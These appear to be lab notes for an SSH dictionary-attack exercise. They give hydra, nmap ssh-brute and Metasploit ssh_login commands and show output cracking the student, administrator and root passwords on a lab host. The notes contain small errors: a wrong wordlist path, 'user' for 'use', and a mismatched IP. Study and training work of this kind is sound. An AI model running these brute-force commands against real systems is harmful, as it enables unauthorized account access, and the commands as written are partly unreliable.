#### Tools
nmap
gzip
ssh
hydra
msfconsole

#### Commands
Unzip wordlest
```
gzip -d /usr/share/wordlists.rockyou.txt.gz
```

Brute force ssh with hydra and rock you word list
```
hydra -l student -P /usr/share/wordlists/rockyou.txt target_ip ssh
```

Brute force ssh for password with username
```
nmap target_ip -p 22 --script ssh-brute --script-args userdb=user 
```

Get a user password with msfconsole
```
msfconsole
use auxiliary/scanner/ssh/ssh_login
show options
set rhost target_ip
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
options
```

## Lab
### Questions
1.  Find the password of user “student” using hydra.

```
hydra -l student -P rockyou.txt  192.154.144.3 ssh

[22][ssh] host: 192.154.144.3   login: student   password: friend
```

2.  Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst

```
hydra -l administrator -P /usr/share/nmap/nselib/data/passwords.lst 192.154.144.3 ssh

[22][ssh] host: 192.154.144.3   login: administrator   password: sunshine

nmap 192.154.144.3 --script ssh-brute --script-args userdb=users

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 29 guesses in 6 seconds, average tps: 4.8
MAC Address: 02:42:C0:9A:90:03 (Unknown)
```

3.  Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt

```
metasploit

set LHOST 192.154.144.2
user auxiliary/scanner/ssh/ssh_login

set RHOST 192.154.144.3
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set VERBOSE true
set STOP_ON_SUCCESS true

exploit

[-] 192.154.144.3:22 - Failed: 'root:'
[-] 192.154.144.3:22 - Failed: 'root:!root'
[-] 192.154.144.3:22 - Failed: 'root:Cisco'
[-] 192.154.144.3:22 - Failed: 'root:NeXT'
[-] 192.154.144.3:22 - Failed: 'root:QNX'
[-] 192.154.144.3:22 - Failed: 'root:admin'
[+] 192.154.144.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
```

4.  What is the message of the day? (Printed after the user logs in to the SSH server).

```
ssh root@192.54.144.3
password=attack

cat /etc/motd

SSH recon dictionary attack lab
```
### Answers

1. friend 
2. sunshine
3. attack